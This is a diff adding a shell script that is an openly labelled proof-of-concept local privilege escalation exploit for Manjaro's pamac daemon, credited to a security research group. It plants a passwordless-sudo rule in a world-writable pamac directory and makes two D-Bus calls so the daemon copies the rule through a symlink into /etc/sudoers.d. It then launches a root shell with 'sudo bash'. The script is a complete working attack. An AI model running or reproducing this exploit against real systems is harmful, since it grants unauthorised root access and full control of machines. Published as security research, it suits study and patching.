@@ -1,0 +1,78 @@
+#!/bin/sh
+#
+# (C) 2023 by c->skills research Sebastian Krahmer https://github.com/c-skills/vala-vala-hey
+#
+# Not using C/C++ does not automatically makes you secure :)
+#
+# See LICENSE.txt file for terms and conditions (GPL3).
+
+echo
+echo "[!!] Manjaro OS LPE PoC"
+echo "[!!] (C) 2023 by c->skills research"
+echo
+
+cat /etc/os-release
+echo
+
+umask 077
+
+user=`id -u -n`
+
+DSTDIR="/etc/sudoers.d/"
+PAMAC="/var/tmp/pamac/dbs/sync"
+PAMACDB="$PAMAC/refresh_timestamp"
+SUDO="$user ALL=(ALL) NOPASSWD:ALL"
+
+echo
+echo "[+] Setting up pathnames";
+
+# Due to world writable dirs, we can dump stuff to a file
+rm -f $PAMACDB || true; echo $SUDO > $PAMACDB
+
+echo "[+] 1st DBUS call"
+echo
+
+# the following dbus call basically spawns:
+# cp --preserve=timestamps -u /var/tmp/pamac/dbs/sync/* /var/lib/pacman/sync
+# copying our dumped stuff to /var/lib/...
+dbus-send --system --print-reply --dest="org.manjaro.pamac.daemon" \
+"/org/manjaro/pamac/daemon" \
+"org.manjaro.pamac.daemon.StartTransRun" \
+boolean:true boolean:true boolean:true boolean:true \
+int32:1 \
+array:string:s1 \
+array:string:s2 \
+array:string:s3 \
+array:string:s4 \
+array:string:s5 \
+array:string:s6
+
+echo
+echo "[?] Going to sleep for 10s"
+
+# need to sleep to honor cp -u switch so that next cp will overwrite refresh_timestamp
+# file in target dir that we symlinked to /etc/sudoers.d
+sleep 10
+
+echo "[+] 2nd stage pathnames setup ..."
+
+rm -rf $PAMAC
+ln -s $DSTDIR $PAMAC
+
+echo "[+] 2nd DBUS call"
+echo
+
+# this dbus call spawns:
+# cp --preserve=timestamps -u /var/lib/pacman/* /var/tmp/pamac/dbs/sync
+# copying back our previous dumped stuff to a directory that we symlink
+# to /etc/sudoers.d, again due to world writable dir perms
+dbus-send --system --print-reply --dest="org.manjaro.pamac.daemon" \
+"/org/manjaro/pamac/daemon" \
+"org.manjaro.pamac.daemon.StartDownloadUpdates" \
+
+echo
+echo "[*] Done. Calling boomsh in 10s!";
+sleep 10
+
+sudo bash
+
